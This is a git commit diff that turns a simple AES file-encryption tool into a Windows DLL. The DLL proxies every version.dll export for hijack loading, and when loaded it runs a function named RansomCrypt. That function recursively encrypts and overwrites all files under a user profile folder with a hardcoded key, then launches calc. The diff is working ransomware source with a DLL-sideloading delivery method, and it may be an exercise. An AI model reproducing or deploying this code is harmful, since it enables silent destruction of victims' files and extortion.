22f0955d03f9295bc4d1a176d815ece477c89c24
TomF0x <31590092+TomF0x@users.noreply.github.com>
2022-03-21 21:27:30 +0100

    Crypto++ Aes

--- client/cryptoaes/TestAes/TestAes.cpp
+++ client/cryptoaes/TestAes/TestAes.cpp
@@ -1,76 +1,105 @@
 #include <iostream>
-#include <iomanip>
 #include <fstream>
 #include "modes.h"
 #include "aes.h"
 #include "filters.h"
-#include "sstream"
-#include "base64.h"
 #include <iostream>
-#include <vector>
-#include <string>
 #include <filesystem>
+#include <windows.h>
+
+#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoA")
+#pragma comment(linker, "/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.dll.GetFileVersionInfoByHandle")
+#pragma comment(linker, "/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoExA")
+#pragma comment(linker, "/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoExW")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeA")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeExA")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeExW")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeW")
+#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoW")
+#pragma comment(linker, "/export:VerFindFileA=C:\\Windows\\System32\\version.dll.VerFindFileA")
+#pragma comment(linker, "/export:VerFindFileW=C:\\Windows\\System32\\version.dll.VerFindFileW")
+#pragma comment(linker, "/export:VerInstallFileA=C:\\Windows\\System32\\version.dll.VerInstallFileA")
+#pragma comment(linker, "/export:VerInstallFileW=C:\\Windows\\System32\\version.dll.VerInstallFileW")
+#pragma comment(linker, "/export:VerLanguageNameA=C:\\Windows\\System32\\version.dll.VerLanguageNameA")
+#pragma comment(linker, "/export:VerLanguageNameW=C:\\Windows\\System32\\version.dll.VerLanguageNameW")
+#pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.dll.VerQueryValueA")
+#pragma comment(linker, "/export:VerQueryValueW=C:\\Windows\\System32\\version.dll.VerQueryValueW")
 
 using namespace std;
-using std::filesystem::recursive_directory_iterator;
+using namespace CryptoPP;
 namespace fs = std::filesystem;
 
-int main(int argc, char* argv[]) {
-    string path = "./";
-    fstream fin, fout;
-    char c;
-    int nb_file =0;
-    CryptoPP::byte key[32], iv[32];
-    memset(key, 20, 32);
-    memset(iv, 112584871684, 32);
 
-    if (argc == 1) {
-        string encoded;
-        for (const auto& file : recursive_directory_iterator(path)) {
-            string ciphertext, text;
-            fin.open(fs::absolute(file), fstream::in);
-            while (fin >> noskipws >> c) {
-                text += c;
-            }
-            fin.close();
-            CryptoPP::AES::Encryption aesEncryption(key, 32);
-            CryptoPP::CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, iv);
-            CryptoPP::StreamTransformationFilter stfEncryptor(cbcEncryption, new CryptoPP::StringSink(ciphertext));
-            stfEncryptor.Put(reinterpret_cast<const unsigned char*>(text.c_str()), text.length());
+void RansomCrypt() {
+    string path = "C:\\Users\\PC";
+    CryptoPP::byte key[32], iv[16];
+    memset(key, 20, 32);
+    memset(iv, 1125884, 16);
+
+    for (const auto& filename : fs::recursive_directory_iterator(path)) {
+        try {
+            fstream file;
+            string cipherText;
+            file.open(fs::absolute(filename), fstream::in | ios::binary);
+            string contents((istreambuf_iterator<char>(file)), (istreambuf_iterator<char>()));
+            file.close();
+            AES::Encryption aesEncryption(key, 16);
+            CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, iv);
+            StreamTransformationFilter stfEncryptor(cbcEncryption, new StringSink(cipherText));
+            stfEncryptor.Put(reinterpret_cast<const unsigned char*>(contents.c_str()), contents.length());
             stfEncryptor.MessageEnd();
-            std::string encoded = base64_encode(ciphertext);
-            fout.open(std::filesystem::absolute(file), fstream::out);
-            fout << encoded;
-            fout.close();
-            nb_file += 1;
+            file.open(fs::absolute(filename), fstream::out | fstream::trunc | ios::binary);
+            file << cipherText;
+            file.close();
         }
-        cout << "Encrypted files: " << nb_file << endl;
-        exit(0);
+        catch (...) {}
     }
-    else if (argc == 2) {
-        for (const auto& file : recursive_directory_iterator(path)) {
-            string decryptedtext, text;
-            try {
-                fin.open(fs::absolute(file), fstream::in);
-                while (fin >> noskipws >> c) {
-                    text += c;
-                }
-                fin.close();
-                std::string decoded = base64_decode(text);
-                CryptoPP::AES::Decryption aesDecryption(key, 32);
-                CryptoPP::CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, iv);
-                CryptoPP::StreamTransformationFilter stfDecryptor(cbcDecryption, new CryptoPP::StringSink(decryptedtext));
-                stfDecryptor.Put(reinterpret_cast<const unsigned char*>(decoded.c_str()), decoded.size());
-                stfDecryptor.MessageEnd();
-                fout.open(fs::absolute(file), fstream::out);
-                fout << decryptedtext;
-                fout.close();
-                nb_file += 1;
-            }
-            catch (...){}
+    system("start calc");
+    exit(0);
+}
+
+void RansomDecrypt() {
+    string path = "C:\\Users\\PC";
+    CryptoPP::byte key[32], iv[16];
+    memset(key, 20, 32);
+    memset(iv, 1125884, 16);
+
+    for (const auto& filename : fs::recursive_directory_iterator(path)) {
+        try {
+            fstream file;
+            string plainText;
+            file.open(fs::absolute(filename), fstream::in | ios::binary);
+            string contents((istreambuf_iterator<char>(file)), (istreambuf_iterator<char>()));
+            file.close();
+            AES::Decryption aesDecryption(key, 16);
+            CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, iv);
+            StreamTransformationFilter stfDecryptor(cbcDecryption, new StringSink(plainText));
+            stfDecryptor.Put(reinterpret_cast<const unsigned char*>(contents.c_str()), contents.length());
+            stfDecryptor.MessageEnd();
+            file.open(fs::absolute(filename), fstream::out | fstream::trunc | ios::binary);
+            file << plainText;
+            file.close();
         }
-        cout << "Decrypted files: " << nb_file << endl;
-        exit(0);
+        catch (...) {}
     }
-    return 0;
+    system("start calc");
+    exit(0);
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+{
+    switch (fdwReason)
+    {
+    case DLL_PROCESS_ATTACH:
+        RansomCrypt();
+        //RansomDecrypt();
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
 }
